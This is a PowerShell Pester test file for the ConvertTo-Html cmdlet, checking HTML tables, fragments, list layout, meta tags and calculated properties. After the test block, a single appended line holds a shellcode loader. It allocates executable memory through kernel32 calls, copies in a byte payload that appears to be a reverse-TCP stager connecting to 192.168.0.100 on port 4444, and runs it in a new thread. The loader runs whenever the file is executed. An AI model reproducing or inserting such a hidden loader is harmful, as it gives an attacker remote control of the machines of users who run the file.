

Describe "ConvertTo-Html Tests" -Tags "CI" {

    BeforeAll {
        $customObject = [pscustomobject]@{"Name" = "John Doe"; "Age" = 42; "Friends" = ("Jack", "Jill")}
        $newLine = "`r`n"
    }

    function normalizeLineEnds([string]$text)
    {
        $text -replace "`r`n?|`n", "`r`n"
    }

    It "Test ConvertTo-Html with no parameters" {
        $returnObject = $customObject | ConvertTo-Html
        ,$returnObject | Should -BeOfType System.Object[]
        $returnString = $returnObject -join $newLine
        $expectedValue = normalizeLineEnds @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>HTML TABLE</title>
</head><body>
<table>
<colgroup><col/><col/><col/></colgroup>
<tr><th>Name</th><th>Age</th><th>Friends</th></tr>
<tr><td>John Doe</td><td>42</td><td>System.Object[]</td></tr>
</table>
</body></html>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-Html Fragment parameter" {
        $returnString = ($customObject | ConvertTo-Html -Fragment) -join $newLine
        $expectedValue = normalizeLineEnds @"
<table>
<colgroup><col/><col/><col/></colgroup>
<tr><th>Name</th><th>Age</th><th>Friends</th></tr>
<tr><td>John Doe</td><td>42</td><td>System.Object[]</td></tr>
</table>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-Html as List" {
        $returnString = ($customObject | ConvertTo-Html -As List) -join $newLine
        $expectedValue = normalizeLineEnds @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>HTML TABLE</title>
</head><body>
<table>
<tr><td>Name:</td><td>John Doe</td></tr>
<tr><td>Age:</td><td>42</td></tr>
<tr><td>Friends:</td><td>System.Object[]</td></tr>
</table>
</body></html>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-Html specified properties" {
        $returnString = ($customObject | ConvertTo-Html -Property Name, Friends -As List) -join $newLine
        $expectedValue = normalizeLineEnds @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>HTML TABLE</title>
</head><body>
<table>
<tr><td>Name:</td><td>John Doe</td></tr>
<tr><td>Friends:</td><td>System.Object[]</td></tr>
</table>
</body></html>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-Html using page parameters" {
        $returnString = ($customObject | ConvertTo-Html -Title "Custom Object" -Body "Body Text" -CssUri "page.css" -As List) -join $newLine
        $expectedValue = normalizeLineEnds @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Custom Object</title>
<link rel="stylesheet" type="text/css" href="page.css" />
</head><body>
Body Text
<table>
<tr><td>Name:</td><td>John Doe</td></tr>
<tr><td>Age:</td><td>42</td></tr>
<tr><td>Friends:</td><td>System.Object[]</td></tr>
</table>
</body></html>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-Html pre and post" {
        $returnString = ($customObject | ConvertTo-Html -PreContent "Before the object" -PostContent "After the object") -join $newLine
        $expectedValue = normalizeLineEnds @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>HTML TABLE</title>
</head><body>
Before the object
<table>
<colgroup><col/><col/><col/></colgroup>
<tr><th>Name</th><th>Age</th><th>Friends</th></tr>
<tr><td>John Doe</td><td>42</td><td>System.Object[]</td></tr>
</table>
After the object
</body></html>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-HTML meta"{
        $returnString = ($customObject | ConvertTo-HTML -Meta @{"author"="John Doe"}) -join $newLine
        $expectedValue = normalizeLineEnds @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta name="author" content="John Doe">
<title>HTML TABLE</title>
</head><body>
<table>
<colgroup><col/><col/><col/></colgroup>
<tr><th>Name</th><th>Age</th><th>Friends</th></tr>
<tr><td>John Doe</td><td>42</td><td>System.Object[]</td></tr>
</table>
</body></html>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-HTML meta with invalid properties should throw warning" {
        $parms = @{"authors"="John Doe";"keywords"="PowerShell,PSv6"}
        
        [string]$observedProperties = $customObject | ConvertTo-HTML -Meta $parms 3>&1
        $observedProperties | Should -Match $parms["authors"]
    }

    It "Test ConvertTo-HTML charset"{
        $returnString = ($customObject | ConvertTo-HTML -Charset "utf-8") -join $newLine
        $expectedValue = normalizeLineEnds @"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="UTF-8">
<title>HTML TABLE</title>
</head><body>
<table>
<colgroup><col/><col/><col/></colgroup>
<tr><th>Name</th><th>Age</th><th>Friends</th></tr>
<tr><td>John Doe</td><td>42</td><td>System.Object[]</td></tr>
</table>
</body></html>
"@
        $returnString | Should -Be $expectedValue
    }

    It "Test ConvertTo-HTML transitional"{
        $returnString = $customObject | ConvertTo-HTML -Transitional | Select-Object -First 1
        $returnString | Should -Be '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'
    }

    It "Test ConvertTo-HTML supports scriptblock-based calculated properties: by hashtable" {
        $returnString = ($customObject | ConvertTo-HTML @{ l = 'NewAge'; e = { $_.Age + 1 } }) -join $newLine
        $returnString | Should -Match '\b43\b'
    }

    It "Test ConvertTo-HTML supports scriptblock-based calculated properties: directly" {
        $returnString = ($customObject | ConvertTo-HTML { $_.Age + 1 }) -join $newLine
        $returnString | Should -Match '\b43\b'
    }

    It "Test ConvertTo-HTML calculated property supports 'name' key as alias of 'label'" {
        $returnString = ($customObject | ConvertTo-Html @{ name = 'AgeRenamed'; e = 'Age'}) -join $newLine
        $returnString | Should -Match 'AgeRenamed'
    }

    It "Test ConvertTo-HTML calculated property supports integer 'width' entry" {
        $returnString = ($customObject | ConvertTo-Html @{ e = 'Age'; width = 10 }) -join $newLine
        $returnString | Should -Match '\swidth\s*=\s*(["''])10\1'
    }

    It "Test ConvertTo-HTML calculated property supports string 'width' entry" {
        $returnString = ($customObject | ConvertTo-Html @{ e = 'Age'; width = '10' }) -join $newLine
        $returnString | Should -Match '\swidth\s*=\s*(["''])10\1'
    }

}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x64,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

